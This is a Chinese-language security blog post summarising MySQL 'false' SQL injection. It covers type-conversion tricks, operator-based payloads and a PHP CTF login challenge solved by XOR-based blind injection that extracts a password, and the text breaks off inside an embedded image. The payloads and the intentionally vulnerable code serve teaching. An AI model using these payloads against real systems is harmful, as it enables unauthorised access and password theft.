<!DOCTYPE html>
<html lang="en" color-mode="light">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="author" content="KaynZ" />
  <!-- Open Graph Description 简短摘要-->
  
  <!-- 用于搜索引擎的文章摘要 -->
  
  
  
  <title>
    
      Summary of SQL Injection 
      
      
      |
    
     L0ki&#39;s Website
  </title>

  
    <link rel="apple-touch-icon" href="/images/favicon.png">
    <link rel="icon" href="/images/favicon.png">
  

  <!-- Raleway-Font -->
  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">

  <!-- hexo site css -->
  <link rel="stylesheet" href="/css/main.css" />
  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
  <!-- 代码块风格 -->
  
    
<link rel="stylesheet" href="/css/figcaption/mac-block.css">

  

  <!-- jquery3.3.1 -->
  
    <script defer type="text/javascript" src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
  

  <!-- fancybox -->
  
    <link href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" rel="stylesheet">
    <script defer type="text/javascript" src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
  
  
<script src="/js/fancybox.js"></script>


  

  

  <script>
    var html = document.documentElement
    const colorMode = localStorage.getItem('color-mode')
    if (colorMode) {
      document.documentElement.setAttribute('color-mode', colorMode)
    }
  </script>
<meta name="generator" content="Hexo 7.1.1"><link rel="alternate" href="/atom.xml" title="L0ki's Website" type="application/atom+xml">
</head>


  <body>
    <div id="app">
      <div class="header">
  <div class="avatar">
    <a href="/">
      <!-- 头像取消懒加载，添加no-lazy -->
      
        <img no-lazy src="/images/avatar.png" alt="">
      
    </a>
    <div class="nickname"><a href="/">L0ki</a></div>
  </div>
  <div class="navbar">
    <ul>
      
        <li class="nav-item" data-path="/">
          <a href="/">Home</a>
        </li>
      
        <li class="nav-item" data-path="/archives/">
          <a href="/archives/">Archives</a>
        </li>
      
        <li class="nav-item" data-path="/about/">
          <a href="/about/">About</a>
        </li>
      
        <li class="nav-item" data-path="/portfolio/">
          <a href="/portfolio/">Portfolio</a>
        </li>
      
        <li class="nav-item" data-path="/tags/">
          <a href="/tags/">Tags</a>
        </li>
      
    </ul>
  </div>
</div>


<script src="/js/activeNav.js"></script>



      <div class="flex-container">
        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->


  <!-- LaTex Display -->

  
    <script async type="text/javascript" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script>
  
  <script>
    MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      }
    }
  </script>





  <!-- clipboard -->

  
    <script async type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.10/dist/clipboard.min.js"></script>
  
  
<script src="/js/codeCopy.js"></script>







  

  

  

  
  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
  <div class="container post-details" id="post-details">
    <div class="post-content">
      <div class="post-title">Summary of SQL Injection</div>
      <div class="post-attach">
        <span class="post-pubtime">
          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
          2024-04-21 02:20:17
        </span>
        
              <span class="post-tags">
                <i class="iconfont icon-tags mr-10" title="Tags"></i>
                
                <span class="span--tag mr-8">
                  <a href="/tags/Vulnerabilities/" title="Vulnerabilities">
                    #Vulnerabilities
                  </a>
                </span>
                
              </span>
          
      </div>
      <div class="markdown-body">
        <h2 id="False注入"><a href="#False注入" class="headerlink" title="False注入"></a>False注入</h2><h3 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h3><ul>
<li>false注入这种注入方式有的优势就是，在某些特定时候可以绕过WAF或者是一些其他的绕过。</li>
<li>比较多的是在登录验证的时候影响比较大，</li>
<li>在where进行限定的时候产生一些比较不可预期的错误</li>
<li>譬如删除数据的时候如果代码过滤不严，这里利用严重的可以删除整个表。</li>
<li>当然这里可以通过配合其他的姿势来进行利用</li>
</ul>
<h3 id="mysql隐式类型的转换"><a href="#mysql隐式类型的转换" class="headerlink" title="mysql隐式类型的转换"></a>mysql隐式类型的转换</h3><ul>
<li>如果两个参数比较，有至少一个NULL，结果就是NULL，除了是用NULL&lt;&#x3D;&gt;NULL 会返回1。不做类型转换</li>
<li>两个参数都是字符串，按照字符串比较。不做类型转换</li>
<li>两个参数都是整数，按照整数比较。不做类型转换</li>
<li>如果不与数字进行比较，则将十六进制值视为二进制字符串。</li>
<li>有一个参数是 TIMESTAMP 或 DATETIME，并且另外一个参数是常量，常量会被转换为时间戳</li>
<li>有一个参数是 decimal 类型，如果另外一个参数是 decimal 或者整数，会将整数转换为 decimal 后进行比较，如果另外一个参数是浮点数，则会把 decimal 转换为浮点数进行比较</li>
<li><strong>所有其他情况下，两个参数都会被转换为浮点数再进行比较</strong></li>
<li>如果我是字符串和数字比较，需要将字符串转为浮点数，这很明显会转换失败</li>
</ul>
<h3 id="过滤指定的字符串"><a href="#过滤指定的字符串" class="headerlink" title="过滤指定的字符串"></a>过滤指定的字符串</h3><p>trim函数可以过滤指定的字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">完整格式：TRIM([&#123;BOTH | LEADING | TRAILING&#125; [remstr] FROM] str)</span><br><span class="line">mysql&gt; SELECT TRIM(&#x27;  bar   &#x27;);  </span><br><span class="line">            -&gt; &#x27;bar&#x27;  </span><br><span class="line">mysql&gt; SELECT TRIM(LEADING &#x27;x&#x27; FROM &#x27;xxxbarxxx&#x27;);   --删除指定的首字符 x  </span><br><span class="line">            -&gt; &#x27;barxxx&#x27;  </span><br><span class="line">mysql&gt; SELECT TRIM(BOTH &#x27;x&#x27; FROM &#x27;xxxbarxxx&#x27;);      --删除指定的首尾字符 x  </span><br><span class="line">            -&gt; &#x27;bar&#x27;  </span><br><span class="line">mysql&gt; SELECT TRIM(TRAILING &#x27;xyz&#x27; FROM &#x27;barxxyz&#x27;);  --删除指定的尾字符 x  </span><br><span class="line">            -&gt; &#x27;barx&#x27;  </span><br></pre></td></tr></table></figure>

<h3 id="1-1、算术运算"><a href="#1-1、算术运算" class="headerlink" title="1.1、算术运算"></a>1.1、算术运算</h3><p>加：<code>+</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;+&#x27;,</span><br><span class="line">拼接的语句：where username=&#x27;&#x27;+&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<p>减：<code>-</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;-&#x27;</span><br><span class="line">拼接的语句：where username=&#x27;&#x27;-&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<p>乘：<code>*</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;*&#x27;</span><br><span class="line">拼接的语句：where username=&#x27;&#x27;*&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<p>除：<code>/</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/6#</span><br><span class="line">拼接的语句：where username=&#x27;&#x27;/6#</span><br></pre></td></tr></table></figure>

<p>取余：<code>%</code></p>
<blockquote>
<p>%的原理：分子为字符串转化为0,他分母不能为0,分母为0的话结果为NULL,分母不为0的话 结果都为0</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;%1#</span><br><span class="line">拼接的语句：where username=&#x27;&#x27;%1#</span><br></pre></td></tr></table></figure>

<h3 id="1-2、-位操作运算"><a href="#1-2、-位操作运算" class="headerlink" title="1.2、 位操作运算"></a>1.2、 位操作运算</h3><p>我们可以使用当字符串和数字运算的时候类型转换的问题进行利用</p>
<blockquote>
<p>如果任一操作数为NULL，则返回NULL。 对于非NULL操作数，如果奇数个操作数非零，则求值为1，否则返回0</p>
</blockquote>
<p>我们可以用的位运算符有：</p>
<p>和运算：<code>&amp;</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&amp;0#</span><br><span class="line">拼接的语句：where username=&#x27;&#x27;&amp;0#&#x27;</span><br></pre></td></tr></table></figure>

<p>或运算：<code>|</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;|0#</span><br><span class="line">拼接的语句：where username=&#x27;&#x27;|0#&#x27;</span><br></pre></td></tr></table></figure>

<p>异或运算：<code>^</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;^0#</span><br><span class="line">拼接的语句：where username=&#x27;&#x27;^0#&#x27;</span><br></pre></td></tr></table></figure>

<p>移位操作：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&lt;&lt;0#</span><br><span class="line">&#x27;&gt;&gt;0#</span><br></pre></td></tr></table></figure>

<p>位非（~）：这里位非运算符由于是在表达式之前的</p>
<h3 id="1-3、-比较运算符"><a href="#1-3、-比较运算符" class="headerlink" title="1.3、 比较运算符"></a>1.3、 比较运算符</h3><p>安全等于：<code>&lt;=&gt;</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select 1&lt;=&gt;null -- 结果为0</span><br><span class="line">select null &lt;=&gt; null -- 结果为1</span><br><span class="line">&#x27;=0&lt;=&gt;1#</span><br><span class="line">拼接的语句：where username=&#x27;&#x27;=0&lt;=&gt;1#&#x27;</span><br></pre></td></tr></table></figure>

<p>不等于<code>&lt;&gt;(!=)</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;=0&lt;&gt;0#</span><br><span class="line">拼接的语句：where username=&#x27;&#x27;=0&lt;&gt;0#&#x27;</span><br></pre></td></tr></table></figure>

<p>大小于<code>&gt;或&lt;</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&gt;-1#</span><br><span class="line">拼接的语句：where username=&#x27;&#x27;&gt;-1#</span><br></pre></td></tr></table></figure>

<h3 id="1-4、-其他"><a href="#1-4、-其他" class="headerlink" title="1.4、 其他"></a>1.4、 其他</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#x27;+1 is not null#</span><br><span class="line"></span><br><span class="line">&#x27;in(-1,1)#    (in结果集有null不影响;)</span><br><span class="line"></span><br><span class="line">&#x27;not in(1,0)#   (not in的结果集中出现null则查询结果为null;)</span><br><span class="line"></span><br><span class="line">&#x27;like 1#</span><br><span class="line"></span><br><span class="line">&#x27;REGEXP 1#</span><br><span class="line"></span><br><span class="line">&#x27;BETWEEN 1 AND 1#</span><br><span class="line"></span><br><span class="line">&#x27;div 1#</span><br><span class="line"></span><br><span class="line">&#x27;xor 1#</span><br><span class="line"></span><br><span class="line">&#x27;=round(0,1)=&#x27;1</span><br><span class="line"></span><br><span class="line">&#x27;&lt;&gt;ifnull(1,2)=&#x27;1</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="1-5-综合利用"><a href="#1-5-综合利用" class="headerlink" title="1.5 综合利用"></a>1.5 综合利用</h3><p>有时候如果我们的注入点不能有数字出现，比如过滤了数字，那我们该如何利用？</p>
<p>这里就可以利用一些内置的函数或运算来构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select &#x27;aaa&#x27;=&#x27;&#x27;-&#x27;&#x27;;</span><br><span class="line">+-------------+</span><br><span class="line">| &#x27;aaa&#x27;=&#x27;&#x27;-&#x27;&#x27; |</span><br><span class="line">+-------------+</span><br><span class="line">|           1 |</span><br><span class="line">+-------------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select &#x27;aaa&#x27;=~~&#x27;&#x27;;</span><br><span class="line">+------------+</span><br><span class="line">| &#x27;aaa&#x27;=~~&#x27;&#x27; |</span><br><span class="line">+------------+</span><br><span class="line">|          1 |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set, 2 warnings (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select &#x27;aaa&#x27;=mod(pi(),pi());</span><br><span class="line">+----------------------+</span><br><span class="line">| &#x27;aaa&#x27;=mod(pi(),pi()) |</span><br><span class="line">+----------------------+</span><br><span class="line">|                    1 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br></pre></td></tr></table></figure>

<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>这里举例一道题</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$conn</span> -&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;set names utf8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">randStr</span>(<span class="params"><span class="variable">$lenth</span>=<span class="number">32</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$strBase</span> = <span class="string">&quot;1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&quot;</span>;</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$lenth</span>&gt;<span class="number">0</span>)&#123;</span><br><span class="line">      <span class="variable">$str</span>.=<span class="title function_ invoke__">substr</span>(<span class="variable">$strBase</span>,<span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="title function_ invoke__">strlen</span>(<span class="variable">$strBase</span>)-<span class="number">1</span>),<span class="number">1</span>);</span><br><span class="line">      <span class="variable">$lenth</span> --;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$install</span>)&#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;create table `user` (</span></span><br><span class="line"><span class="string">         `id` int(10) unsigned NOT NULL PRIMARY KEY  AUTO_INCREMENT ,</span></span><br><span class="line"><span class="string">         `username` varchar(30) NOT NULL,</span></span><br><span class="line"><span class="string">         `passwd` varchar(32) NOT NULL,</span></span><br><span class="line"><span class="string">         `role` varchar(30) NOT NULL</span></span><br><span class="line"><span class="string">       )ENGINE=MyISAM AUTO_INCREMENT=1 DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci &quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>))&#123;</span><br><span class="line">       <span class="variable">$sql</span>  = <span class="string">&quot;insert into `user`(`username`,`passwd`,`role`) values (&#x27;admin&#x27;,&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">randStr</span>()).<span class="string">&quot;&#x27;,&#x27;admin&#x27;)&quot;</span>;</span><br><span class="line">       <span class="variable">$conn</span> -&gt; <span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">     <span class="variable">$filter</span> = <span class="string">&quot;/ |\*|#|;|,|is|union|like|regexp|for|and|or|file|--|\||`|&amp;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%09&#x27;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%0a&quot;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%0b&quot;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%0c&#x27;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%0d&#x27;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%a0&#x27;</span>).<span class="string">&quot;/i&quot;</span>;</span><br><span class="line">     <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$filter</span>,<span class="variable">$str</span>))&#123;</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">&quot;you can&#x27;t input this illegal char!&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$username</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">global</span> <span class="variable">$conn</span>;</span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">&quot;select role from `user` where username =&#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">  <span class="variable">$res</span> = <span class="variable">$conn</span> -&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$res</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$username</span> is &quot;</span>.<span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()[<span class="string">&#x27;role&#x27;</span>];</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;Don&#x27;t have this user!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$passwd</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$conn</span>;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$username</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$username</span>));</span><br><span class="line">    <span class="variable">$passwd</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$passwd</span>));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$username</span> == <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;you can&#x27;t login this as admin!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where username=&#x27;&quot;</span>.<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">escape_string</span>(<span class="variable">$username</span>).<span class="string">&quot;&#x27; and passwd=&#x27;&quot;</span>.<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">escape_string</span>(<span class="variable">$passwd</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$res</span> = <span class="variable">$conn</span> -&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$res</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()[<span class="string">&#x27;role&#x27;</span>] === <span class="string">&#x27;admin&#x27;</span>) <span class="keyword">exit</span>(<span class="variable">$flag</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;sorry,username or passwd error!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">source</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>])?<span class="title function_ invoke__">filter</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]):<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$passwd</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])?<span class="title function_ invoke__">filter</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]):<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])?<span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]):<span class="string">&quot;source&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$action</span>)&#123;</span><br><span class="line">   <span class="keyword">case</span> <span class="string">&quot;source&quot;</span>: <span class="title function_ invoke__">source</span>(); <span class="keyword">break</span> ;</span><br><span class="line">   <span class="keyword">case</span> <span class="string">&quot;login&quot;</span> : <span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$passwd</span>);<span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="string">&quot;show&quot;</span> : <span class="title function_ invoke__">show</span>(<span class="variable">$username</span>);<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们注意到filter()函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filter</span> = <span class="string">&quot;/ |\*|#|;|,|is|union|like|regexp|for|and|or|file|--|\||`|&amp;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%09&#x27;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%0a&quot;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%0b&quot;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%0c&#x27;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%0d&#x27;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%a0&#x27;</span>).<span class="string">&quot;/i&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>这里看起来过滤的比较多，其中and，or还有&amp;，|都被过滤了，这个时候就可以利用false进行盲注。</p>
<p>可以在show函数利用查询的时候注入，</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username <span class="operator">=</span> &quot;admin&#x27;^!(mid((passwd)from(-&#123;pos&#125;))=&#x27;&#123;passwd&#125;&#x27;)=&#x27;1&quot;</span><br></pre></td></tr></table></figure>

<p>这里官方给出的就是利用异或，其实这里并不需要 ’admin‘ 只要是一串字符串就可以</p>
<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQ